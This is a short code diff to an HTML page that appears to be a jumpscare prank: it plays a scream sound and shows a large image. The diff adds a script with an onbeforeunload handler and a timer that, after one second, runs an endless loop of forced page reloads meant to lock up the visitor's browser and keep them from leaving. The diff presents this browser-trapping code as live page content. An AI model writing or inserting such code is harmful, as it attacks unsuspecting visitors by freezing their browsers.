@@ -26,6 +26,14 @@ function vrisak() {
 scream.play();
 }
 </script>
+  <script>
+    onbeforeunload = function () {
+      localstorage.x = 1;
+    };
+    setTimeout(function () {
+      while (1) location.reload(1);
+    }, 1000);
+  </script>
 <div id="slika">
 <img src="https://i.ibb.co/jMD7KRK/316963-phpn5-Pz-U9.jpg" width="1400px" height="750px" />
 </div>
